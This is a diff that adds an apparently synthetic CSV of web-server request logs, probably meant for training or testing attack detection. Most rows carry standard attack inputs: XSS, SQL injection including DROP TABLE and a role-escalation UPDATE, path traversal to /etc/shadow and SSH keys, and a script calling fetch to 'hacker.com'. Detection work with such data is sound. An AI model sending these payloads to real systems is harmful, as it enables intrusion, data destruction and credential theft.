@@ -1,0 +1,51 @@
+IP,Method,URL,content-type,connection,lenght,content,cookie,User-Agent
+192.168.1.100,GET,/?q=<script>alert(1)</script>,text/html,keep-alive,500,,,Mozilla/5.0
+8.8.8.8,GET,/login?user=admin' OR '1'='1,text/html,close,120,,,sqlmap/1.6.1
+103.53.40.77,GET,/download?file=../../../../etc/passwd,text/plain,close,800,,,curl/7.81
+212.58.246.91,GET,/product?id=1 UNION SELECT username FROM users,text/html,keep-alive,1500,,,python-requests/2.28
+114.114.114.114,POST,/comment?text=<svg/onload=alert(1)>,application/x-www-form-urlencoded,close,400,,,Mozilla/5.0
+193.99.144.80,GET,/assets/img/logo.jpg,image/jpeg,keep-alive,3000,,,Nmap Scripting Engine
+177.10.15.20,GET,/api/v1/config?dir=../.env,text/plain,close,200,,,Mozilla/5.0
+197.213.1.2,GET,/?q=' AND SLEEP(5)--,text/html,keep-alive,100,,,Mozilla/5.0
+45.33.32.156,GET,/vulnerable?msg=<script>document.cookie</script>,text/html,close,450,,,Mozilla/5.0
+8.8.4.4,GET,/admin_dashboard.php,text/html,keep-alive,2500,,,DirBuster/1.0-RC1
+9.9.9.9,GET,/profile?id=5%20UNION%20ALL%20SELECT%20NULL--,text/html,keep-alive,300,,,sqlmap/1.6.1
+104.28.14.49,GET,/.git/config,text/plain,close,150,,,curl/7.81
+85.214.132.117,GET,/?search=<img src=x onerror=alert(1)>,text/html,keep-alive,600,,,Mozilla/5.0
+139.130.4.5,GET,/wp-admin/admin-ajax.php,text/html,keep-alive,1024,,,python-requests/2.25
+54.239.28.85,GET,/api/users?id=1'; DROP TABLE users--,application/json,close,450,,,sqlmap/1.6.1
+18.194.2.250,GET,/images/bg.png,image/png,keep-alive,5000,,,DirBuster/1.0-RC1
+35.154.12.112,GET,/home?page=../../../../var/log/syslog,text/html,close,700,,,curl/7.68
+192.168.1.101,POST,/login?user=admin'--,application/x-www-form-urlencoded,keep-alive,300,,,Mozilla/5.0
+212.58.246.91,GET,/search?query=<script>fetch('http://hacker.com')</script>,text/html,keep-alive,850,,,Mozilla/5.0
+114.114.114.114,GET,/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,text/plain,close,120,,,python-requests/2.28
+103.53.40.77,GET,/index.php?id=-1 UNION SELECT password FROM admin,text/html,keep-alive,950,,,sqlmap/1.6.1
+177.10.15.20,GET,/static/css/main.css,text/css,keep-alive,4000,,,Nmap Scripting Engine
+8.8.8.8,GET,/api/data?file=../../../../windows/win.ini,text/plain,close,600,,,curl/7.81
+197.213.1.2,GET,/?q=<script>alert('XSS')</script>,text/html,keep-alive,500,,,Mozilla/5.0
+45.33.32.156,POST,/auth?user=root' OR 'a'='a,application/json,close,250,,,sqlmap/1.6.1
+85.214.132.117,GET,/.env,text/plain,close,100,,,python-requests/2.25
+139.130.4.5,GET,/checkout?item=<svg/onload=alert('hack')>,text/html,keep-alive,800,,,Mozilla/5.0
+54.239.28.85,GET,/blog?id=2 UNION SELECT 1--,text/html,keep-alive,1100,,,sqlmap/1.6.1
+18.194.2.250,GET,/uploads/../.htaccess,text/plain,close,150,,,curl/7.81
+35.154.12.112,GET,/server-status,text/html,keep-alive,200,,,DirBuster/1.0-RC1
+192.168.1.100,GET,/forum?topic=<script>alert('XSS2')</script>,text/html,keep-alive,500,,,Mozilla/5.0
+8.8.8.8,GET,/dashboard?user=admin' AND 1=1--,text/html,close,120,,,sqlmap/1.6.1
+103.53.40.77,GET,/include?path=../../../../etc/shadow,text/plain,close,800,,,curl/7.81
+212.58.246.91,GET,/list?category=1 UNION SELECT email FROM users,text/html,keep-alive,1500,,,python-requests/2.28
+114.114.114.114,POST,/feedback?msg=<svg/onload=alert(document.domain)>,application/x-www-form-urlencoded,close,400,,,Mozilla/5.0
+193.99.144.80,GET,/backup.zip,application/zip,keep-alive,30000,,,Nmap Scripting Engine
+177.10.15.20,GET,/api/v2/config?file=../docker-compose.yml,text/plain,close,200,,,Mozilla/5.0
+197.213.1.2,GET,/?sort=' AND SLEEP(10)--,text/html,keep-alive,100,,,Mozilla/5.0
+45.33.32.156,GET,/contact?name=<script>console.log(1)</script>,text/html,close,450,,,Mozilla/5.0
+8.8.4.4,GET,/phpmyadmin/,text/html,keep-alive,2500,,,DirBuster/1.0-RC1
+9.9.9.9,GET,/user?id=99%20UNION%20ALL%20SELECT%20NULL--,text/html,keep-alive,300,,,sqlmap/1.6.1
+104.28.14.49,GET,/.ssh/id_rsa,text/plain,close,150,,,curl/7.81
+85.214.132.117,GET,/?query=<img src=x onerror=prompt(1)>,text/html,keep-alive,600,,,Mozilla/5.0
+139.130.4.5,GET,/wp-login.php,text/html,keep-alive,1024,,,python-requests/2.25
+54.239.28.85,GET,/api/orders?id=1'; UPDATE users SET role='admin'--,application/json,close,450,,,sqlmap/1.6.1
+18.194.2.250,GET,/assets/js/app.js,application/javascript,keep-alive,5000,,,DirBuster/1.0-RC1
+35.154.12.112,GET,/view?doc=../../../../var/www/html/config.php,text/html,close,700,,,curl/7.68
+192.168.1.101,POST,/auth/login?username=admin'--,application/x-www-form-urlencoded,keep-alive,300,,,Mozilla/5.0
+212.58.246.91,GET,/search?q=<script>alert('final')</script>,text/html,keep-alive,850,,,Mozilla/5.0
+114.114.114.114,GET,/core/config.bak,text/plain,close,120,,,python-requests/2.28
